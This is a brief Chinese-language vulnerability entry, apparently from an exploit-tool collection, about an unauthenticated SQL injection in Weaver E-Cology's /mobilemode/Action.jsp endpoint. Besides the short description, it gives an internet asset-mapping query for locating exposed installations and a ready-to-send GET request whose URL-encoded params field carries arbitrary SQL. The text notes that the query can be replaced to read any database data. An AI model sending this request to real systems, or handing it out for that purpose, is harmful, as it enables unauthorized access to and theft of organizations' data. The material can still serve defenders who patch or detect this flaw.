---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Cology mobilemode Action.jsp SQL注入漏洞

## 漏洞描述

泛微 E-Cology 移动端 `/mobilemode/Action.jsp` 接口的 `MECAdminAction` 动作中存在SQL注入漏洞。攻击者无需登录，通过 `getDatasBySQL` 动作配合 `noLogin=1` 参数可执行任意 SQL 查询，直接读取数据库敏感信息。

## 漏洞影响

```
泛微 E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /mobilemode/Action.jsp?invocke=MECAdminAction&action=getDatasBySQL&params=%7B%22sql%22:%22select%20user%22%7D&noLogin=1 HTTP/1.1
```

其中 `params` 为 URL 编码后的 JSON：`{"sql":"select user"}`。响应中将直接返回 SQL 查询结果，攻击者可替换 SQL 语句读取任意数据。
